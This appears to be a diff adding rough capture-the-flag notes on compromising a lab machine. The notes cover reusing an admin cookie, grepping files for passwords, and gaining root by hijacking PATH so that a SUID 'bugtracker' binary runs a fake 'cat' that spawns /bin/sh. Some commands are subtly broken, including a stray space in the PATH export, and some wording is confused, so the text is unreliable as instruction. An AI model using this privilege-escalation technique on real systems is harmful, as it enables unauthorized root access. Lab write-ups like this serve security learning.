@@ -1,0 +1,46 @@
+If the upload page is only assessable by admin, find the admin account cookie in account page or profile page.
+
+34322 -admin
+
+cat * | grep -i passwd*
+
+/usr/bin/bugtracker is a suid file
+------------------------------------
+
+#/usr/bin/bugtracker
+
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: root.txt
+root.txt
+---------------
+
+cat: /root/reports/root.txt: No such file or directory
+
+
+So cat is suid file.
+---------------------
+
+#cd /tmp
+#echo "/bin/sh" > cat
+#chmod +x cat
+#export PATH= /tmp:$PATH
+#$PATH
+
+
+Second time running the application (get the root priv)
+
+
+#/usr/bin/bugtracker
+
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: 0398940824
+root.txt
+---------------
+
+#whoami
